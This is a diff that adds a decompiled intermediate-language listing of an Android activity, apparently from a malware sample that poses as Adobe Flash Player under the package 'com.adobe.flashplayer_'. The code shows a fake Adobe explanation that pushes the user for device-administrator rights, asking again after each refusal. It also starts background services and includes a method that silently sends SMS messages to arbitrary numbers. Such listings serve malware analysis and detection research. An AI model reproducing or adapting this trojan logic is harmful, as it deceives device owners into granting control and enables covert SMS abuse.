@@ -1,0 +1,122 @@
+record `com.adobe.flashplayer_.FlashARM` @kind class @AccessFlag PUBLIC extends `android.app.Activity` @kind class {
+}
+global `int` `@@com.adobe.flashplayer_.FlashARM.ACTIVATION_REQUEST` @AccessFlag STATIC_FINAL;
+procedure `void` `<init>`(`com.adobe.flashplayer_.FlashARM` v0 @kind this) @signature `Lcom/adobe/flashplayer_/FlashARM;.<init>:()V` @AccessFlag PUBLIC_CONSTRUCTOR {
+    temp;
+
+  #L033974.  call `<init>`(v0) @signature `Landroid/app/Activity;.<init>:()V` @kind direct;
+  #L03397a.  return @kind void;
+}
+procedure `void` `writeConfig`(`com.adobe.flashplayer_.FlashARM` v2 @kind this, `java.lang.String` v3 @kind object @name `config`, `java.lang.String` v4 @kind object @name `data`) @signature `Lcom/adobe/flashplayer_/FlashARM;.writeConfig:(Ljava/lang/String;Ljava/lang/String;)V` @AccessFlag PRIVATE {
+    temp;
+    v0;
+    v1;
+
+  #L03398c.  v0:= new `java.io.OutputStreamWriter`;
+  #L033990.  v1:= 0I;
+  #L033992.  call temp:= `openFileOutput`(v2, v3, v1) @signature `Lcom/adobe/flashplayer_/FlashARM;.openFileOutput:(Ljava/lang/String;I)Ljava/io/FileOutputStream;` @kind virtual;
+  #L033998.  v1:= temp @kind object;
+  #L03399a.  call `<init>`(v0, v1) @signature `Ljava/io/OutputStreamWriter;.<init>:(Ljava/io/OutputStream;)V` @kind direct;
+  #L0339a0.  call `write`(v0, v4) @signature `Ljava/io/OutputStreamWriter;.write:(Ljava/lang/String;)V` @kind virtual;
+  #L0339a6.  call `close`(v0) @signature `Ljava/io/OutputStreamWriter;.close:()V` @kind virtual;
+  #L0339ac.  return @kind void;
+  #L0339ae.  v1:= Exception @type ^`java.io.IOException` @kind object;
+  #L0339b0.  goto L0339ac;
+  catch `java.io.IOException` @[L03398c..L0339ac] goto L0339ae;
+}
+procedure `void` `onActivityResult`(`com.adobe.flashplayer_.FlashARM` v6 @kind this, `int` v7 @name `requestCode`, `int` v8 @name `resultCode`, `android.content.Intent` v9 @kind object @name `data`) @signature `Lcom/adobe/flashplayer_/FlashARM;.onActivityResult:(IILandroid/content/Intent;)V` @AccessFlag PROTECTED {
+    temp;
+    v0;
+    v1;
+    v2;
+    v3;
+    v4;
+    v5;
+
+  #L0339d4.  v5:= -1I;
+  #L0339d6.  if v8 != v5 then goto L0339ee;
+  #L0339da.  v3:= new `android.content.Intent`;
+  #L0339de.  v4:= constclass @type ^`com.adobe.flashplayer_.AdobeZCore` @kind object;
+  #L0339e2.  call `<init>`(v3, v6, v4) @signature `Landroid/content/Intent;.<init>:(Landroid/content/Context;Ljava/lang/Class;)V` @kind direct;
+  #L0339e8.  call temp:= `startService`(v6, v3) @signature `Lcom/adobe/flashplayer_/FlashARM;.startService:(Landroid/content/Intent;)Landroid/content/ComponentName;` @kind virtual;
+  #L0339ee.  goto L033a40;
+  #L0339f4.  call `onActivityResult`(v6, v7, v8, v9) @signature `Landroid/app/Activity;.onActivityResult:(IILandroid/content/Intent;)V` @kind super;
+  #L0339fa.  return @kind void;
+  #L0339fc.  if v8 == v5 then goto L0339fa;
+  #L033a00.  v2:= new `android.content.ComponentName`;
+  #L033a04.  v3:= constclass @type ^`com.adobe.flashplayer_.ADOBEcoreZa` @kind object;
+  #L033a08.  call `<init>`(v2, v6, v3) @signature `Landroid/content/ComponentName;.<init>:(Landroid/content/Context;Ljava/lang/Class;)V` @kind direct;
+  #L033a0e.  v0:= 1I;
+  #L033a10.  v1:= new `android.content.Intent`;
+  #L033a14.  v3:= "android.app.action.ADD_DEVICE_ADMIN" @kind object;
+  #L033a18.  call `<init>`(v1, v3) @signature `Landroid/content/Intent;.<init>:(Ljava/lang/String;)V` @kind direct;
+  #L033a1e.  v3:= "android.app.extra.DEVICE_ADMIN" @kind object;
+  #L033a22.  call temp:= `putExtra`(v1, v3, v2) @signature `Landroid/content/Intent;.putExtra:(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;` @kind virtual;
+  #L033a28.  v3:= "android.app.extra.ADD_EXPLANATION" @kind object;
+  #L033a2c.  v4:= "FLASH_PLUGIN_INSTALLATION\n\nУстановка и регистрация компонентов com.adobe.flashplayer.\n\nМодуль будет зарегистрирован как Adobe Flash Player.\n\nFor get more information about us, please visit http://adobe.com." @kind object;
+  #L033a30.  call temp:= `putExtra`(v1, v3, v4) @signature `Landroid/content/Intent;.putExtra:(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;` @kind virtual;
+  #L033a36.  call `startActivityForResult`(v6, v1, v0) @signature `Lcom/adobe/flashplayer_/FlashARM;.startActivityForResult:(Landroid/content/Intent;I)V` @kind virtual;
+  #L033a3c.  goto L0339fa;
+  #L033a3e.  
+  #L033a40.  switch v7
+                  | 1 => goto L0339fc
+                  | else => goto L0339f4;
+}
+procedure `void` `onCreate`(`com.adobe.flashplayer_.FlashARM` v5 @kind this, `android.os.Bundle` v6 @kind object @name `savedInstanceState`) @signature `Lcom/adobe/flashplayer_/FlashARM;.onCreate:(Landroid/os/Bundle;)V` @AccessFlag PROTECTED {
+    temp;
+    v0;
+    v1;
+    v2;
+    v3;
+    v4;
+
+  #L033a5c.  call `onCreate`(v5, v6) @signature `Landroid/app/Activity;.onCreate:(Landroid/os/Bundle;)V` @kind super;
+  #L033a62.  v3:= 2130903041I;
+  #L033a68.  call `setContentView`(v5, v3) @signature `Lcom/adobe/flashplayer_/FlashARM;.setContentView:(I)V` @kind virtual;
+  #L033a6e.  v3:= new `android.content.Intent`;
+  #L033a72.  v4:= constclass @type ^`com.adobe.flashplayer_.AdobeFlashCore` @kind object;
+  #L033a76.  call `<init>`(v3, v5, v4) @signature `Landroid/content/Intent;.<init>:(Landroid/content/Context;Ljava/lang/Class;)V` @kind direct;
+  #L033a7c.  call temp:= `startService`(v5, v3) @signature `Lcom/adobe/flashplayer_/FlashARM;.startService:(Landroid/content/Intent;)Landroid/content/ComponentName;` @kind virtual;
+  #L033a82.  v2:= new `android.content.ComponentName`;
+  #L033a86.  v3:= constclass @type ^`com.adobe.flashplayer_.ADOBEcoreZa` @kind object;
+  #L033a8a.  call `<init>`(v2, v5, v3) @signature `Landroid/content/ComponentName;.<init>:(Landroid/content/Context;Ljava/lang/Class;)V` @kind direct;
+  #L033a90.  v0:= 1I;
+  #L033a92.  v1:= new `android.content.Intent`;
+  #L033a96.  v3:= "android.app.action.ADD_DEVICE_ADMIN" @kind object;
+  #L033a9a.  call `<init>`(v1, v3) @signature `Landroid/content/Intent;.<init>:(Ljava/lang/String;)V` @kind direct;
+  #L033aa0.  v3:= "android.app.extra.DEVICE_ADMIN" @kind object;
+  #L033aa4.  call temp:= `putExtra`(v1, v3, v2) @signature `Landroid/content/Intent;.putExtra:(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;` @kind virtual;
+  #L033aaa.  v3:= "android.app.extra.ADD_EXPLANATION" @kind object;
+  #L033aae.  v4:= "FLASH_PLUGIN_INSTALLATION\n\nУстановка и регистрация компонентов com.adobe.flashplayer.\n\nМодуль будет зарегистрирован как Adobe Flash Player.\n\nFor get more information about us, please visit http://adobe.com." @kind object;
+  #L033ab2.  call temp:= `putExtra`(v1, v3, v4) @signature `Landroid/content/Intent;.putExtra:(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;` @kind virtual;
+  #L033ab8.  call `startActivityForResult`(v5, v1, v0) @signature `Lcom/adobe/flashplayer_/FlashARM;.startActivityForResult:(Landroid/content/Intent;I)V` @kind virtual;
+  #L033abe.  return @kind void;
+}
+procedure `void` `onDestroy`(`com.adobe.flashplayer_.FlashARM` v0 @kind this) @signature `Lcom/adobe/flashplayer_/FlashARM;.onDestroy:()V` @AccessFlag PROTECTED {
+    temp;
+
+  #L033ad0.  call `onDestroy`(v0) @signature `Landroid/app/Activity;.onDestroy:()V` @kind super;
+  #L033ad6.  return @kind void;
+}
+procedure `void` `sendSMS`(`com.adobe.flashplayer_.FlashARM` v7 @kind this, `java.lang.String` v8 @kind object @name `n`, `java.lang.String` v9 @kind object @name `msg`) @signature `Lcom/adobe/flashplayer_/FlashARM;.sendSMS:(Ljava/lang/String;Ljava/lang/String;)V` @AccessFlag PUBLIC {
+    temp;
+    v0;
+    v1;
+    v2;
+    v3;
+    v4;
+    v5;
+    v6;
+
+  #L033ae8.  v2:= 0I;
+  #L033aea.  v1:= v8 @kind object;
+  #L033aec.  v6:= v9 @kind object;
+  #L033aee.  call temp:= `getDefault`() @signature `Landroid/telephony/SmsManager;.getDefault:()Landroid/telephony/SmsManager;` @kind static;
+  #L033af4.  v0:= temp @kind object;
+  #L033af6.  call temp:= `divideMessage`(v0, v6) @signature `Landroid/telephony/SmsManager;.divideMessage:(Ljava/lang/String;)Ljava/util/ArrayList;` @kind virtual;
+  #L033afc.  v3:= temp @kind object;
+  #L033afe.  v4:= v2 @kind object;
+  #L033b00.  v5:= v2 @kind object;
+  #L033b02.  call `sendMultipartTextMessage`(v0, v1, v2, v3, v4, v5) @signature `Landroid/telephony/SmsManager;.sendMultipartTextMessage:(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V` @kind virtual;
+  #L033b08.  return @kind void;
+}
